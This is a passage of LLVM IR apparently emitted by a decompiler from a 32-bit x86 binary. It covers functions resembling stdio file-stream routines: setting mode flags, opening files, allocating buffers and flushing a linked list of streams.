  %v1_804bcfa = add i32 %v0_804bcfa, 1
  store i32 %v1_804bcfa, i32* %eax.global-to-local, align 4
  %v1_804bcfd = and i32 %v0_804bcf8, 32771
  store i32 %v1_804bcfd, i32* %edx.global-to-local, align 4
  %v1_804bd03 = load i32, i32* @ebp, align 4
  %v2_804bd03 = add i32 %v1_804bd03, 4
  %v3_804bd03 = inttoptr i32 %v2_804bd03 to i32*
  store i32 %arg4, i32* %v3_804bd03, align 4
  %v0_804bd06 = load i32, i32* %edx.global-to-local, align 4
  %v1_804bd06 = add i32 %v0_804bd06, 1
  store i32 %v1_804bd06, i32* @edx, align 4
  %v0_804bd07 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd07 = and i32 %v0_804bd07, %v1_804bd06
  store i32 %v2_804bd07, i32* %eax.global-to-local, align 4
  %v12_804bd09 = icmp eq i32 %v2_804bd07, %v1_804bd06
  %v1_804bd0b = icmp eq i1 %v12_804bd09, false
  br i1 %v1_804bd0b, label %dec_label_pc_804bc76, label %dec_label_pc_804bd11

dec_label_pc_804bd11:                             ; preds = %dec_label_pc_804bcf8
  %v0_804bd11 = load i32, i32* @esi, align 4
  %v1_804bd13 = and i32 %v0_804bd11, 1024
  %v1_804bd15 = xor i32 %v1_804bd13, 1024
  store i32 %v1_804bd15, i32* %eax.global-to-local, align 4
  %v1_804bd1a = load i32, i32* @ebx, align 4
  %v2_804bd1a = and i32 %v1_804bd1a, %v1_804bd15
  %v3_804bd1a = icmp eq i32 %v2_804bd1a, 0
  br i1 %v3_804bd1a, label %dec_label_pc_804bd11.dec_label_pc_804bd37_crit_edge, label %dec_label_pc_804bd1e

dec_label_pc_804bd11.dec_label_pc_804bd37_crit_edge: ; preds = %dec_label_pc_804bd11
  br label %dec_label_pc_804bd37

dec_label_pc_804bd1e:                             ; preds = %dec_label_pc_804bd11
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v4_804bd27 = call i32 @function_804f62c(i32 %arg4, i32 4, i32 1024, i32 %v1_804bd15)
  store i32 %v4_804bd27, i32* %eax.global-to-local, align 4
  %v1_804bd2f = icmp eq i32 %v4_804bd27, 0
  %v1_804bd31 = icmp eq i1 %v1_804bd2f, false
  br i1 %v1_804bd31, label %dec_label_pc_804bc76, label %dec_label_pc_804bd1e.dec_label_pc_804bd37_crit_edge

dec_label_pc_804bd1e.dec_label_pc_804bd37_crit_edge: ; preds = %dec_label_pc_804bd1e
  %v0_804bd37.pre = load i32, i32* @esi, align 4
  %v0_804bd3d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bd37

dec_label_pc_804bd37:                             ; preds = %dec_label_pc_804bd11.dec_label_pc_804bd37_crit_edge, %dec_label_pc_804bd1e.dec_label_pc_804bd37_crit_edge
  %v0_804bd3d = phi i32 [ %v1_804bd1a, %dec_label_pc_804bd11.dec_label_pc_804bd37_crit_edge ], [ %v0_804bd3d.pre, %dec_label_pc_804bd1e.dec_label_pc_804bd37_crit_edge ]
  %v0_804bd37 = phi i32 [ %v0_804bd11, %dec_label_pc_804bd11.dec_label_pc_804bd37_crit_edge ], [ %v0_804bd37.pre, %dec_label_pc_804bd1e.dec_label_pc_804bd37_crit_edge ]
  %v1_804bd37 = and i32 %v0_804bd37, 32768
  %v2_804bd3d = or i32 %v1_804bd37, %v0_804bd3d
  store i32 %v2_804bd3d, i32* @ebx, align 4
  br label %dec_label_pc_804bd62

dec_label_pc_804bd41:                             ; preds = %dec_label_pc_804bcf4
  %v1_804bd41 = add i32 %arg4, 1
  %v8_804bd41 = icmp eq i32 %v1_804bd41, 0
  store i32 %v1_804bd41, i32* @edi, align 4
  %v0_804bd4d.pre = load i32, i32* @ebx, align 4
  br i1 %v8_804bd41, label %dec_label_pc_804bd47, label %dec_label_pc_804bd44

dec_label_pc_804bd44:                             ; preds = %dec_label_pc_804bd41
  %v11_804bd44 = or i32 %v0_804bd4d.pre, 32768
  store i32 %v11_804bd44, i32* @ebx, align 4
  br label %dec_label_pc_804bd47

dec_label_pc_804bd47:                             ; preds = %dec_label_pc_804bd41, %dec_label_pc_804bd44
  %v0_804bd4d = phi i32 [ %v11_804bd44, %dec_label_pc_804bd44 ], [ %v0_804bd4d.pre, %dec_label_pc_804bd41 ]
  %v0_804bd4e = load i32, i32* @esi, align 4
  store i32 %v0_804bd4e, i32* %stack_var_-76, align 4
  %v3_804bd4f = inttoptr i32 %v0_804bd4e to i8*
  %v4_804bd4f = call i32 @function_804f96c(i8* %v3_804bd4f, i32 %v0_804bd4d, i32 438)
  store i32 %v4_804bd4f, i32* %eax.global-to-local, align 4
  %v1_804bd57 = load i32, i32* @ebp, align 4
  %v2_804bd57 = add i32 %v1_804bd57, 4
  %v3_804bd57 = inttoptr i32 %v2_804bd57 to i32*
  store i32 %v4_804bd4f, i32* %v3_804bd57, align 4
  %v2_804bd5a = icmp slt i32 %v4_804bd4f, 0
  br i1 %v2_804bd5a, label %dec_label_pc_804bc89, label %dec_label_pc_804bd62

dec_label_pc_804bd62:                             ; preds = %dec_label_pc_804bd47, %dec_label_pc_804bd37
  %v0_804bd62 = load i32, i32* @ebp, align 4
  %v1_804bd62 = inttoptr i32 %v0_804bd62 to i16*
  %v2_804bd62 = load i16, i16* %v1_804bd62, align 2
  %v3_804bd62 = and i16 %v2_804bd62, 8192
  store i16 %v3_804bd62, i16* %v1_804bd62, align 2
  %v0_804bd68 = load i32, i32* @ebx, align 4
  %v8_804bd6a = and i32 %v0_804bd68, -31744
  %v1_804bd6f = urem i32 %v0_804bd68, 4
  %v1_804bd72 = add nuw nsw i32 %v1_804bd6f, 1
  store i32 %v1_804bd72, i32* %eax.global-to-local, align 4
  %v1_804bd73 = load i32, i32* @ebp, align 4
  %v2_804bd73 = inttoptr i32 %v1_804bd73 to i32*
  %v3_804bd73 = load i32, i32* %v2_804bd73, align 4
  %v4_804bd73 = or i32 %v3_804bd73, %v8_804bd6a
  %v1_804bd76 = mul nuw nsw i32 %v1_804bd72, 16
  %v2_804bd79 = xor i32 %v1_804bd76, 48
  store i32 %v2_804bd79, i32* %eax.global-to-local, align 4
  %v2_804bd7c = or i32 %v4_804bd73, %v2_804bd79
  store i32 %v2_804bd7c, i32* @ebx, align 4
  %v1_804bd7e = trunc i32 %v2_804bd7c to i16
  %v3_804bd7e = inttoptr i32 %v1_804bd73 to i16*
  store i16 %v1_804bd7e, i16* %v3_804bd7e, align 2
  %v0_804bd82 = load i32, i32* %stack_var_-76, align 4
  %v1_804bd82 = call i32 @function_804b774(i32 %v0_804bd82)
  store i32 %v1_804bd82, i32* %eax.global-to-local, align 4
  store i32 %v1_804bd82, i32* @esi, align 4
  %v1_804bd8c = inttoptr i32 %v1_804bd82 to i32*
  %v2_804bd8c = load i32, i32* %v1_804bd8c, align 4
  store i32 %v2_804bd8c, i32* @edi, align 4
  %v0_804bd8e = load i32, i32* @ebp, align 4
  %v1_804bd8e = add i32 %v0_804bd8e, 4
  %v2_804bd8e = inttoptr i32 %v1_804bd8e to i32*
  %v3_804bd8e = load i32, i32* %v2_804bd8e, align 4
  store i32 %v3_804bd8e, i32* %stack_var_-76, align 4
  %v1_804bd91 = call i32 @function_804d380(i32 %v3_804bd8e)
  %v2_804bd99 = mul i32 %v1_804bd91, 256
  store i32 %v2_804bd99, i32* %eax.global-to-local, align 4
  %v0_804bd9c = load i32, i32* @ebx, align 4
  %v2_804bd9c = or i32 %v0_804bd9c, %v2_804bd99
  store i32 %v2_804bd9c, i32* @ebx, align 4
  %v1_804bd9e = trunc i32 %v2_804bd9c to i16
  %v2_804bd9e = load i32, i32* @ebp, align 4
  %v3_804bd9e = inttoptr i32 %v2_804bd9e to i16*
  store i16 %v1_804bd9e, i16* %v3_804bd9e, align 2
  %v0_804bda2 = load i32, i32* @edi, align 4
  %v1_804bda2 = load i32, i32* @esi, align 4
  %v2_804bda2 = inttoptr i32 %v1_804bda2 to i32*
  store i32 %v0_804bda2, i32* %v2_804bda2, align 4
  %v0_804bda4 = load i32, i32* @ebp, align 4
  %v1_804bda4 = add i32 %v0_804bda4, 8
  %v2_804bda4 = inttoptr i32 %v1_804bda4 to i32*
  %v3_804bda4 = load i32, i32* %v2_804bda4, align 4
  %v4_804bda4 = icmp eq i32 %v3_804bda4, 0
  %v1_804bda8 = icmp eq i1 %v4_804bda4, false
  br i1 %v1_804bda8, label %dec_label_pc_804bdd8, label %dec_label_pc_804bdaa

dec_label_pc_804bdaa:                             ; preds = %dec_label_pc_804bd62
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804bdb2 = call i32 @function_804da52(i32 4096)
  store i32 %v1_804bdb2, i32* %eax.global-to-local, align 4
  %v1_804bdba = load i32, i32* @ebp, align 4
  %v2_804bdba = add i32 %v1_804bdba, 8
  %v3_804bdba = inttoptr i32 %v2_804bdba to i32*
  store i32 %v1_804bdb2, i32* %v3_804bdba, align 4
  %v1_804bdbd = icmp eq i32 %v1_804bdb2, 0
  %v0_804bdd1 = load i32, i32* @ebp, align 4
  br i1 %v1_804bdbd, label %dec_label_pc_804bdd1, label %dec_label_pc_804bdc1

dec_label_pc_804bdc1:                             ; preds = %dec_label_pc_804bdaa
  %v1_804bdc1 = inttoptr i32 %v0_804bdd1 to i16*
  %v2_804bdc1 = load i16, i16* %v1_804bdc1, align 2
  %v3_804bdc1 = or i16 %v2_804bdc1, 16384
  store i16 %v3_804bdc1, i16* %v1_804bdc1, align 2
  %v1_804bdc7 = add i32 %v1_804bdb2, 4096
  store i32 %v1_804bdc7, i32* %eax.global-to-local, align 4
  %v1_804bdcc = load i32, i32* @ebp, align 4
  %v2_804bdcc = add i32 %v1_804bdcc, 12
  %v3_804bdcc = inttoptr i32 %v2_804bdcc to i32*
  store i32 %v1_804bdc7, i32* %v3_804bdcc, align 4
  br label %dec_label_pc_804bdd8

dec_label_pc_804bdd1:                             ; preds = %dec_label_pc_804bdaa
  %v1_804bdd1 = add i32 %v0_804bdd1, 12
  %v2_804bdd1 = inttoptr i32 %v1_804bdd1 to i32*
  store i32 0, i32* %v2_804bdd1, align 4
  br label %dec_label_pc_804bdd8

dec_label_pc_804bdd8:                             ; preds = %dec_label_pc_804bd62, %dec_label_pc_804bdc1, %dec_label_pc_804bdd1
  %v0_804bdd8 = load i32, i32* @ebp, align 4
  %v1_804bdd8 = add i32 %v0_804bdd8, 8
  %v2_804bdd8 = inttoptr i32 %v1_804bdd8 to i32*
  %v3_804bdd8 = load i32, i32* %v2_804bdd8, align 4
  store i32 %v3_804bdd8, i32* %eax.global-to-local, align 4
  %v1_804bddb = add i32 %v0_804bdd8, 2
  %v2_804bddb = inttoptr i32 %v1_804bddb to i8*
  store i8 0, i8* %v2_804bddb, align 1
  %v0_804bddf = load i32, i32* %eax.global-to-local, align 4
  %v1_804bddf = load i32, i32* @ebp, align 4
  %v2_804bddf = add i32 %v1_804bddf, 24
  %v3_804bddf = inttoptr i32 %v2_804bddf to i32*
  store i32 %v0_804bddf, i32* %v3_804bddf, align 4
  %v0_804bde2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bde2 = load i32, i32* @ebp, align 4
  %v2_804bde2 = add i32 %v1_804bde2, 28
  %v3_804bde2 = inttoptr i32 %v2_804bde2 to i32*
  store i32 %v0_804bde2, i32* %v3_804bde2, align 4
  %v0_804bde5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bde5 = load i32, i32* @ebp, align 4
  %v2_804bde5 = add i32 %v1_804bde5, 16
  %v3_804bde5 = inttoptr i32 %v2_804bde5 to i32*
  store i32 %v0_804bde5, i32* %v3_804bde5, align 4
  %v0_804bde8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bde8 = load i32, i32* @ebp, align 4
  %v2_804bde8 = add i32 %v1_804bde8, 20
  %v3_804bde8 = inttoptr i32 %v2_804bde8 to i32*
  store i32 %v0_804bde8, i32* %v3_804bde8, align 4
  %v0_804bdeb = load i32, i32* @ebp, align 4
  %v1_804bdeb = add i32 %v0_804bdeb, 44
  %v2_804bdeb = inttoptr i32 %v1_804bdeb to i32*
  store i32 0, i32* %v2_804bdeb, align 4
  %v0_804bdf2 = load i32, i32* @ebp, align 4
  %v1_804bdf2 = add i32 %v0_804bdf2, 1
  %v2_804bdf2 = inttoptr i32 %v1_804bdf2 to i8*
  %v3_804bdf2 = load i8, i8* %v2_804bdf2, align 1
  %v4_804bdf2 = and i8 %v3_804bdf2, 32
  %v5_804bdf2 = icmp eq i8 %v4_804bdf2, 0
  %v0_804bdf6 = load i32, i32* @global_var_8055e70.116, align 16
  store i32 %v0_804bdf6, i32* @eax, align 4
  %v2_804bdfb = add i32 %v0_804bdf2, 52
  %v3_804bdfb = inttoptr i32 %v2_804bdfb to i32*
  store i32 %v0_804bdf6, i32* %v3_804bdfb, align 4
  br i1 %v5_804bdf2, label %dec_label_pc_804be6d, label %dec_label_pc_804be00

dec_label_pc_804be00:                             ; preds = %dec_label_pc_804bdd8
  %v2_804be0b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804be0b, i32* %stack_var_-76, align 4
  %v2_804be10 = call i32 @function_804f2ae(i32 %v2_804be0b, i32 134541995)
  store i32 %v2_804be10, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8055e58.108 to i32), i32* %stack_var_-76, align 4
  %v1_804be1c = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055e58.108 to i32))
  store i32 %v1_804be1c, i32* @eax, align 4
  %v2_804be2e = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804be2e, i32* %stack_var_-76, align 4
  %v2_804be33 = call i32 @function_804f2ae(i32 %v2_804be2e, i32 134541995)
  store i32 %v2_804be33, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8055e40.117 to i32), i32* %stack_var_-76, align 4
  %v1_804be3f = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055e40.117 to i32))
  %v0_804be44 = load i32, i32* bitcast (i32** @global_var_8055e3c.118 to i32*), align 4
  store i32 %v0_804be44, i32* @eax, align 4
  %v1_804be49 = load i32, i32* @ebp, align 4
  %v2_804be49 = add i32 %v1_804be49, 32
  %v3_804be49 = inttoptr i32 %v2_804be49 to i32*
  store i32 %v0_804be44, i32* %v3_804be49, align 4
  %v0_804be4c = load i32, i32* @ebp, align 4
  store i32 %v0_804be4c, i32* bitcast (i32** @global_var_8055e3c.118 to i32*), align 4
  %v2_804be52 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804be52, i32* @ecx, align 4
  store i32 %v2_804be2e, i32* %stack_var_-76, align 4
  %v2_804be57 = call i32 @function_804f2ae(i32 %v2_804be2e, i32 1)
  store i32 %v2_804be2e, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804be0b, i32* %stack_var_-76, align 4
  %v2_804be61 = call i32 @function_804f2ae(i32 %v2_804be0b, i32 1)
  store i32 %v2_804be61, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804be66

dec_label_pc_804be66:                             ; preds = %dec_label_pc_804bc93, %dec_label_pc_804be00
  br label %dec_label_pc_804be6d

dec_label_pc_804be6b:                             ; preds = %dec_label_pc_804bc89, %dec_label_pc_804bc76
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804be6d

dec_label_pc_804be6d:                             ; preds = %dec_label_pc_804bdd8, %dec_label_pc_804bcc2, %dec_label_pc_804be66, %dec_label_pc_804be6b
  %v0_804be70 = load i32, i32* @ebp, align 4
  store i32 %v0_804be70, i32* %eax.global-to-local, align 4
  %v2_804be72 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804be72, i32* @ebx, align 4
  store i32 %v0_804bc4a, i32* @esi, align 4
  store i32 %v0_804bc49, i32* @edi, align 4
  store i32 %v0_804bc48, i32* @ebp, align 4
  ret i32 %v0_804be70

; uselistorder directives
  uselistorder i32 %v2_804be2e, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804be0b, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804bdd1, { 1, 0 }
  uselistorder i32 %v1_804bdb2, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804bd99, { 1, 0 }
  uselistorder i32 %v1_804bd82, { 1, 0, 2 }
  uselistorder i32 %v11_804bd44, { 1, 0 }
  uselistorder i32 %v0_804bd4d.pre, { 1, 0 }
  uselistorder i32 %v1_804bd15, { 2, 1, 0 }
  uselistorder i32 %v0_804bd11, { 1, 0 }
  uselistorder i32 %v1_804bd06, { 1, 0, 2 }
  uselistorder i32 %v1_804bcc7, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804bcb6, { 1, 0 }
  uselistorder i32 %v0_804bc89, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 %arg4, { 1, 3, 2, 0, 4, 5 }
  uselistorder label %dec_label_pc_804be6d, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804be66, { 1, 0 }
  uselistorder label %dec_label_pc_804bdd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bd47, { 1, 0 }
  uselistorder label %dec_label_pc_804bd37, { 1, 0 }
  uselistorder label %dec_label_pc_804bcf4, { 1, 0 }
  uselistorder label %dec_label_pc_804bcbe, { 1, 0 }
  uselistorder label %dec_label_pc_804bcb0, { 1, 0 }
  uselistorder label %dec_label_pc_804bca5, { 2, 0, 1 }
}

define i32 @function_804be78() local_unnamed_addr {
dec_label_pc_804be78:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804be79 = load i32, i32* @edi, align 4
  %v0_804be7a = load i32, i32* @esi, align 4
  %v0_804be7b = load i32, i32* @ebx, align 4
  store i32 %v0_804be7b, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804be84 = call i32 @function_804b774(i32 %v0_804be7b)
  store i32 %v1_804be84, i32* @edi, align 4
  %v0_804be8e = load i32, i32* @global_var_8055e80.104, align 128
  store i32 %v0_804be8e, i32* @esi, align 4
  %v1_804be94 = inttoptr i32 %v1_804be84 to i32*
  %v2_804be94 = load i32, i32* %v1_804be94, align 4
  store i32 %v2_804be94, i32* %ebp.global-to-local, align 4
  %v1_804be98 = call i32 @function_804d380(i32 0)
  %v0_804be9d = load i32, i32* @ebx, align 4
  %v2_804be9f = sub i32 %v0_804be9d, %v1_804be98
  %v2_804beaa = mul i32 %v2_804be9f, 256
  %v0_804bead = load i32, i32* @esi, align 4
  %v2_804bead = xor i32 %v0_804bead, %v2_804beaa
  %v1_804beaf = trunc i32 %v2_804bead to i16
  store i16 %v1_804beaf, i16* bitcast (i32* @global_var_8055e80.104 to i16*), align 128
  %v0_804beb6 = load i32, i32* @global_var_8055ed0.105, align 16
  store i32 %v0_804beb6, i32* @esi, align 4
  %v1_804bebc = call i32 @function_804d380(i32 1)
  %v0_804bec1 = load i32, i32* @ebx, align 4
  %v2_804bec1 = sub i32 %v0_804bec1, %v1_804bebc
  %v2_804bec3 = mul i32 %v2_804bec1, 256
  %v0_804bec6 = load i32, i32* @esi, align 4
  %v2_804bec6 = xor i32 %v2_804bec3, %v0_804bec6
  %v1_804bec8 = trunc i32 %v2_804bec6 to i16
  store i16 %v1_804bec8, i16* bitcast (i32* @global_var_8055ed0.105 to i16*), align 16
  %v0_804becf = load i32, i32* %ebp.global-to-local, align 4
  %v1_804becf = load i32, i32* @edi, align 4
  %v2_804becf = inttoptr i32 %v1_804becf to i32*
  store i32 %v0_804becf, i32* %v2_804becf, align 4
  %v2_804bed4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804bed4, i32* @ebx, align 4
  store i32 %v0_804be7a, i32* @esi, align 4
  store i32 %v0_804be79, i32* @edi, align 4
  ret i32 %v1_804bebc

; uselistorder directives
  uselistorder i32 %v1_804be84, { 1, 0 }
  uselistorder i32 (i32)* @function_804d380, { 1, 0, 2 }
}

define i32 @function_804bed9(i32 %arg1) local_unnamed_addr {
dec_label_pc_804bed9:
  %v3_804bee7 = inttoptr i32 %arg1 to i16*
  %v4_804bee7 = call i32 @function_804d150(i16* %v3_804bee7, i32 ptrtoint (i32* @global_var_80536ac.119 to i32), i32 24)
  ret i32 %v4_804bee7
}

define i32 @function_804bef0() local_unnamed_addr {
dec_label_pc_804bef0:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804bef0 = load i32, i32* @esi, align 4
  %v0_804bef1 = load i32, i32* @ebx, align 4
  store i32 %v0_804bef1, i32* %stack_var_-8, align 4
  %v1_804befa = call i32 @function_804bed9(i32 ptrtoint (i32* @global_var_8055e40.117 to i32))
  store i32 %v1_804befa, i32* %eax.global-to-local, align 4
  %v1_804bf06 = call i32 @function_804bed9(i32 ptrtoint (i32* @global_var_8055e58.108 to i32))
  store i32 %v1_804bf06, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_8055e3c.118 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804bf5022 = icmp eq i32 %storemerge21, 0
  %v1_804bf5223 = icmp eq i1 %v1_804bf5022, false
  br i1 %v1_804bf5223, label %dec_label_pc_804bf13.lr.ph, label %dec_label_pc_804bf70.preheader

dec_label_pc_804bf13.lr.ph:                       ; preds = %dec_label_pc_804bef0
  br label %dec_label_pc_804bf13

dec_label_pc_804bf13:                             ; preds = %dec_label_pc_804bf13.lr.ph, %dec_label_pc_804bf3a
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_804bf13.lr.ph ], [ %storemerge, %dec_label_pc_804bf3a ]
  %v1_804bf16 = add i32 %storemerge24, 56
  store i32 %v1_804bf16, i32* @esi, align 4
  %v1_804bf1a = call i32 @function_804f2ab(i32 %v1_804bf16)
  store i32 %v1_804bf1a, i32* %eax.global-to-local, align 4
  %v1_804bf22 = icmp eq i32 %v1_804bf1a, 0
  br i1 %v1_804bf22, label %dec_label_pc_804bf3a, label %dec_label_pc_804bf26

dec_label_pc_804bf26:                             ; preds = %dec_label_pc_804bf13
  %v0_804bf26 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf26 = add i32 %v0_804bf26, 8
  %v2_804bf26 = inttoptr i32 %v1_804bf26 to i32*
  %v3_804bf26 = load i32, i32* %v2_804bf26, align 4
  store i32 %v3_804bf26, i32* %eax.global-to-local, align 4
  %v1_804bf29 = inttoptr i32 %v0_804bf26 to i16*
  store i16 48, i16* %v1_804bf29, align 2
  %v0_804bf2e = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf2e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bf2e = add i32 %v1_804bf2e, 24
  %v3_804bf2e = inttoptr i32 %v2_804bf2e to i32*
  store i32 %v0_804bf2e, i32* %v3_804bf2e, align 4
  %v0_804bf31 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf31 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bf31 = add i32 %v1_804bf31, 28
  %v3_804bf31 = inttoptr i32 %v2_804bf31 to i32*
  store i32 %v0_804bf31, i32* %v3_804bf31, align 4
  %v0_804bf34 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf34 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bf34 = add i32 %v1_804bf34, 16
  %v3_804bf34 = inttoptr i32 %v2_804bf34 to i32*
  store i32 %v0_804bf34, i32* %v3_804bf34, align 4
  %v0_804bf37 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf37 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bf37 = add i32 %v1_804bf37, 20
  %v3_804bf37 = inttoptr i32 %v2_804bf37 to i32*
  store i32 %v0_804bf37, i32* %v3_804bf37, align 4
  br label %dec_label_pc_804bf3a

dec_label_pc_804bf3a:                             ; preds = %dec_label_pc_804bf13, %dec_label_pc_804bf26
  %v0_804bf3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf3d = add i32 %v0_804bf3d, 52
  %v2_804bf3d = inttoptr i32 %v1_804bf3d to i32*
  store i32 1, i32* %v2_804bf3d, align 4
  %v0_804bf44 = load i32, i32* @esi, align 4
  %v1_804bf45 = call i32 @function_804bed9(i32 %v0_804bf44)
  store i32 %v1_804bf45, i32* %eax.global-to-local, align 4
  %v0_804bf4a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf4a = add i32 %v0_804bf4a, 32
  %v2_804bf4a = inttoptr i32 %v1_804bf4a to i32*
  %storemerge = load i32, i32* %v2_804bf4a, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804bf50 = icmp eq i32 %storemerge, 0
  %v1_804bf52 = icmp eq i1 %v1_804bf50, false
  br i1 %v1_804bf52, label %dec_label_pc_804bf13, label %dec_label_pc_804bf4d.dec_label_pc_804bf70.preheader_crit_edge

dec_label_pc_804bf4d.dec_label_pc_804bf70.preheader_crit_edge: ; preds = %dec_label_pc_804bf3a
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_8055e3c.118 to i32*), align 4
  br label %dec_label_pc_804bf70.preheader

dec_label_pc_804bf70.preheader:                   ; preds = %dec_label_pc_804bf4d.dec_label_pc_804bf70.preheader_crit_edge, %dec_label_pc_804bef0
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804bf4d.dec_label_pc_804bf70.preheader_crit_edge ], [ %storemerge21, %dec_label_pc_804bef0 ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804bf703 = icmp eq i32 %storemerge12, 0
  %v1_804bf7210 = icmp eq i1 %v1_804bf703, false
  br i1 %v1_804bf7210, label %dec_label_pc_804bf5c.preheader, label %dec_label_pc_804bf74

dec_label_pc_804bf5c.preheader:                   ; preds = %dec_label_pc_804bf70.preheader
  br label %dec_label_pc_804bf5c

dec_label_pc_804bf5c:                             ; preds = %dec_label_pc_804bf5c.preheader, %dec_label_pc_804bf6d
  %v0_804bf64 = phi i32 [ %storemerge1, %dec_label_pc_804bf6d ], [ %storemerge12, %dec_label_pc_804bf5c.preheader ]
  %v1_804bf5c = inttoptr i32 %v0_804bf64 to i8*
  %v2_804bf5c = load i8, i8* %v1_804bf5c, align 1
  %v3_804bf5c = and i8 %v2_804bf5c, 64
  %v4_804bf5c = icmp eq i8 %v3_804bf5c, 0
  br i1 %v4_804bf5c, label %dec_label_pc_804bf6d, label %dec_label_pc_804bf61

dec_label_pc_804bf61:                             ; preds = %dec_label_pc_804bf5c
  %v1_804bf65 = call i32 @function_804bf78(i32 %v0_804bf64)
  store i32 %v1_804bf65, i32* %eax.global-to-local, align 4
  %v0_804bf6d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bf6d

dec_label_pc_804bf6d:                             ; preds = %dec_label_pc_804bf5c, %dec_label_pc_804bf61
  %v0_804bf6d = phi i32 [ %v0_804bf64, %dec_label_pc_804bf5c ], [ %v0_804bf6d.pre, %dec_label_pc_804bf61 ]
  %v1_804bf6d = add i32 %v0_804bf6d, 32
  %v2_804bf6d = inttoptr i32 %v1_804bf6d to i32*
  %storemerge1 = load i32, i32* %v2_804bf6d, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804bf70 = icmp eq i32 %storemerge1, 0
  %v1_804bf72 = icmp eq i1 %v1_804bf70, false
  br i1 %v1_804bf72, label %dec_label_pc_804bf5c, label %dec_label_pc_804bf74

dec_label_pc_804bf74:                             ; preds = %dec_label_pc_804bf6d, %dec_label_pc_804bf70.preheader
  %v2_804bf74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bf74, i32* %eax.global-to-local, align 4
  %v2_804bf75 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bf75, i32* @ebx, align 4
  store i32 %v0_804bef0, i32* @esi, align 4
  ret i32 %v2_804bf74

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @function_804bed9, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_804bf6d, { 1, 0 }
  uselistorder label %dec_label_pc_804bf5c, { 1, 0 }
  uselistorder label %dec_label_pc_804bf3a, { 1, 0 }
  uselistorder label %dec_label_pc_804bf13, { 1, 0 }
}

define i32 @function_804bf78(i32 %arg1) local_unnamed_addr {
dec_label_pc_804bf78:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804bf78 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804bf80 = add i32 %arg1, 8
  %v2_804bf80 = inttoptr i32 %v1_804bf80 to i32*
  %v3_804bf80 = load i32, i32* %v2_804bf80, align 4
  store i32 %v3_804bf80, i32* %edx.global-to-local, align 4
  %v1_804bf83 = add i32 %arg1, 16
  %v2_804bf83 = inttoptr i32 %v1_804bf83 to i32*
  %v3_804bf83 = load i32, i32* %v2_804bf83, align 4
  %v2_804bf86 = sub i32 %v3_804bf83, %v3_804bf80
